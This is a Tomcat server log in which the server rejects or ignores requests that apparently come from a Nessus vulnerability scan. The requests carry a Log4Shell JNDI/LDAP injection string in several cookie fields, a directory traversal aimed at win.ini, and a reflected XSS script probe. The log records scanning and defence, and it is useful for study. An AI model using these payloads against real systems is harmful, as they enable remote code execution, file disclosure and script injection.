24-Sep-2024 05:35:39.203 INFO [http-nio-45854-exec-5] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [{jndi:ldap://log4shell-generic-aCNOvR16O2qwiGaux0lu${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-aCNOvR16O2qwiGaux0lu${lower:ten}.w.nessus.org/nessus};JSESSIONID=${jndi:ldap://log4shell-generic-aCNOvR16O2qwiGaux0lu${lower:ten}.w.nessus.org/nessus};SESSIONID=${jndi:ldap://log4shell-generic-aCNOvR16O2qwiGaux0lu${lower:ten}.w.nessus.org/nessus};PHPSESSID=${jndi:ldap://log4shell-generic-aCNOvR16O2qwiGaux0lu${lower:ten}.w.nessus.org/nessus};token=${jndi:ldap://log4shell-generic-aCNOvR16O2qwiGaux0lu${lower:ten}.w.nessus.org/nessus};session=${jndi:ldap://log4shell-generic-aCNOvR16O2qwiGaux0lu${lower:ten}.w.nessus.org/nessus}] that contained an invalid cookie. That cookie will be ignored.
 Note: further occurrences of this error will be logged at DEBUG level.
24-Sep-2024 06:57:22.057 INFO [http-nio-45854-exec-8] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in the request target [/search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini ]. The valid characters are defined in RFC 7230 and RFC 3986
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:494)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:829)
24-Sep-2024 23:23:05.540 INFO [http-nio-45854-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in the request target [/cgi-bin/index.php?file=Liens&op="><script>window.alert('test');</script> ]. The valid characters are defined in RFC 7230 and RFC 3986
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:494)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:829)
